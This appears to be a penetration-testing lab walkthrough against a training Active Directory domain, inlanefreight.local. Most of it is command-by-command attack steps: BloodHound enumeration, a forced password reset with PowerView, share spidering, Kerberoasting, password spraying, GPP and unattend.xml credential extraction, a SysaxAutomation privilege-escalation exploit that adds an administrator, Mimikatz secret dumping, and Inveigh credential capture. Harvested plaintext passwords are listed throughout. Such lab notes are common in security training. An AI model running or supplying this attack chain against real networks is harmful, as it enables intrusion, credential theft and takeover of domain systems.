- hporter:Gr8hambino!

**Use SharpHound to enumerate all possible AD objects
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

- Upload SharHound.exe to DEV01 and run it
```
SharpHound.exe -c All
```
- Download ZIP file and start bloodhound on attack host
```
sudo neo4j start
bloodhound
```
- default creds are neo4j:neo4j
- we see hporter has ForceChangePassword on SSMALLS@INLANEFREIGHT.LOCAL
- All domain users can rdp into academy-aen-dev01.inlanefreight.local (Medium finding: excessive active directory group privileges)

**Use PowerView to change ssmalls password
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1

First, let's RDP into the machine stated above to have a more stable connection and PowerShell.
```
proxychains nmap -sT -p 3389 172.16.8.20
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:/home/htb-ac-1480826
```
- Local port forwarding

**Copy tools over
```
net use
copy \\TSCLIENT\_home_htb-ac-1480826\PowerView.ps1 .
```

**Run PowerView to change ssmalls password
```
powershell
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose
```
- Make sure to notify client before a password change.

```
sudo proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!
```


## Share Hunting
- Start hunting for some credentials!
https://github.com/SnaffCon/Snaffler
```
copy \\TSCLIENT\_home_htb-ac-1480826\Snaffler.exe .
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

This fails, so let's spider_plus with CME!
```
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'
```
backupadm:!qazXSW@

**Kerberoast
```
.\Rubeus.exe kerberoast /nowrap
```

## Password Spraying
https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
```
copy \\TSCLIENT\_home_htb-ac-1480826_tools\DomainPasswordSpray.ps1 .
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1
```
- kdenunez:Welcome1
- mmertle:Welcome1


## Misc Techniques
```
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
sudo proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
```
- frontdesk:ILFreightLobby!


## Next Steps
```
proxychains evil-winrm -i 172.16.8.50 -u backupadm
cd c:\panther
type unattend.xml
```
- ilfserveradm:Sys26Admin

## Elevate to system
SysaxAutomation vulnerability (searchsploit 50834)
```
1. Create folder c:\temp
2. Download netcat (nc.exe) to c:\temp
3. Create file 'pwn.bat' in c:\temp with contents
	net localgroup administrators ilfserveradm /add
4. Open command prompt and netcat listener
	nc -nlvvp 1337
5. Open sysaxschedscp.exe from C:\Program Files (x86)\SysaxAutomation
6. Select Setup Scheduled/Triggered Tasks
	- Add task (Triggered)
	- Update folder to monitor to be c:\temp
	- Check 'Run task if a file is added to the monitor folder or subfolder(s)'
	- Choose 'Run any other Program' and choose c:\temp\pwn.bat
	- Uncheck 'Login as the following user to run task'
	- Finish and Save
7. Create new text file in c:\temp
8. Check netcat listener
```
```
gpupdate
net localgroup administrators
```

```
mimikatz.exe
privilege::debug
lsadump::secrets
token::elevate
lsadump::secrets
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
```
- mssqladm:DBAilfreight1!


https://github.com/Kevin-Robertson/Inveigh
- Run as administrator
```
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```
- mpalledorous:1squints2
